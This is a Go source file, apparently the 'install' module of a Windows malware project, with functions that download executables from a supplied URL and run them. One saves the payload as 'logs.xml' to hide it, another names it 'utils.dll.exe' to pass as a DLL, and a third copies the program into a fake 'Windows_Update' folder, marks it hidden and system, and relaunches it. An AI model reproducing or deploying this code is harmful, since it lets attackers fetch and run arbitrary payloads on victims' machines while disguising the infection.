package install

import "os"
import "github.com/cavaliercoder/grab"
import "github.com/cleversoap/go-cp"
import "../spread"
import "../utils"

func Upgrade(link string) {
	//saves link download to logs.xml. Should be a DIRECT download!!!
	grab.Get("logs.xml", link) //donwloads new exe and saves as xml to hide
	utils.Run("logs.xml")            //runs file as binary
}
func CleanUpgrade() {
	if spread.GetExeName() != utils.TARGET_FILE_NAME { //if name not desired
		utils.Run("taskkill /IM " + utils.TARGET_FILE_NAME + " /T /f")                                       //Kill prosses using our name
		os.Remove(os.Getenv("APPDATA") + "\\Windows_Update\\" + utils.TARGET_FILE_NAME)                //In case of undate there will be a exe in the same dir, remove it
		err := cp.Copy(spread.GetExeName(), os.Getenv("APPDATA")+"\\Windows_Update\\"+utils.TARGET_FILE_NAME) // change our name to desired
		if err == nil {
			utils.Run("attrib +H +S %APPDATA%\\Windows_Update\\" + utils.TARGET_FILE_NAME)
			utils.Run("start " + os.Getenv("APPDATA") + "\\Windows_Update\\" + utils.TARGET_FILE_NAME) //run with new mane
			os.Exit(0)                                                                     //kill us
		}
	}
}

func DownloadAndRun(url string) {
	fileName := "utils.dll.exe" // .dll for impersonating dll if user hides common extensions
	grab.Get(os.Getenv("APPDATA")+"\\"+fileName, url)
	utils.Run("start " + os.Getenv("APPDATA") + "\\" + fileName)
}
